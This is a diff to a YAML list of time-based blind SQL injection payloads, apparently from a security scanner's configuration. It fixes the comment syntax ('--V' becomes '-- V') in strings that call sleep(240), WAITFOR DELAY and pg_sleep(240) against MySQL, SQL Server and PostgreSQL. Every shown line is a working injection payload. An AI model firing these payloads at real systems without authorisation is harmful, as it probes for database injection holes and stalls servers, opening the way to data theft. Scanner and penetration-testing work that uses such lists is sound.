@@ -61,7 +61,7 @@ payloads:
   - >-
     ,(select*from(select(sleep(240)))a)
   - >-
-    '(select*from(select(sleep(240)))a)--V
+    '(select*from(select(sleep(240)))a)-- V
   - >-
     '(select*from(select(sleep(240)))a)'
   - >-
@@ -73,17 +73,17 @@ payloads:
   - >-
     "XOR(if(now()=sysdate(),sleep(240),0))XOR"Z
   - >-
-    '; WAITFOR DELAY '0:0:240'--V
+    '; WAITFOR DELAY '0:0:240'-- V
   - >-
-    ' WAITFOR DELAY '0:0:240'--V
+    ' WAITFOR DELAY '0:0:240'-- V
   - >-
     ' WAITFOR DELAY '0:0:240'
   - >-
-    /**/ pg_sleep(240)--V
+    /**/ pg_sleep(240)-- V
   - >-
-    ||pg_sleep(240)--V
+    ||pg_sleep(240)-- V
   - >-
-    '||pg_sleep(240)--V
+    '||pg_sleep(240)-- V
 
 
 
